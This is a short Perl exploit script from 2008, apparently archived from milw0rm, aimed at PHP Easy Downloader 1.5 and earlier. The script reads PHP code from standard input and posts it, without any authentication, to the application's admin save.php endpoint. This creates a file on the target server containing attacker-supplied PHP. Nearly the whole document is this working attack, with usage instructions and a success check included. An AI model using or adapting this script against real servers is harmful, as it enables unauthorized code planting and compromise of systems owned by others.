#!/usr/bin/perl
# --------------------------------------------------------
# PHP Easy Downloader <= 1.5 Remote File Creation Exploit
# By StAkeR aka athos - StAkeR[at]hotmail[dot]it
# On 17/10/2008
# http://www.hasemithut.de/downloads/index.php
# --------------------------------------------------------

use strict;
use LWP::UserAgent;

my $host = shift(@ARGV);
my $file = shift(@ARGV);
my $http = new LWP::UserAgent;

if($host !~ /^http:\/\/(.+?)$/ && $file !~ /(\w+)\.([a-zA-Z])?/)
{
  print "[?] PHP Easy Downloader <= 1.5 Remote File Creation Exploit\r\n";
  print "[?] Usage: perl $0 http://[host] [filename]\r\n";
  exit;
}

chomp(my $code = <STDIN>);

if($code !~ /(<\?php|<\?#)(.*?)\?>/)
{
  print "[?] You must insert PHP Code\r\n";
  exit;
}
  
my $post = $http->post($host.'/file_info/admin/save.php',
                       [
                        filename    => $file,
                        accesses    => $code.'//',
                      ]); 

if($post->is_success)
{
  if($post->as_string =~ /(Upload Date|Change Made!)/i)
  {
    print "[?] $host/file_info/descriptions/$file.0 Created\r\n";
    exit;
  }
  else
  {
    print "[?] Exploit Failed!\r\n";
    exit;
  }
} 


__END__

# milw0rm.com [2008-10-18]
